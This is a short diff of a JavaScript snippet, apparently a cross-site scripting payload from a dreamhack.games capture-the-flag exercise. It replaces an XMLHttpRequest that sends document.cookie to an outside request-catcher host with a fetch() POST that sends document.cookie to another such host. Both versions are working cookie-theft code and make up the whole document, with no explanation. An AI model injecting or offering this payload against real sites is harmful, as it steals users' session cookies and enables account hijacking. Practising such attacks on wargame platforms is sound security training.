@@ -1,3 +1,5 @@
-var xhr = new XMLHttpRequest();
-xhr.open("GET", "https://rdolyvy.request.dreamhack.games/?cookie=" + document.cookie);
-xhr.send();
+fetch('https://rfgoglh.request.dreamhack.games', {
+  method: 'POST',
+  mode: 'no-cors',
+  body: document.cookie
+});
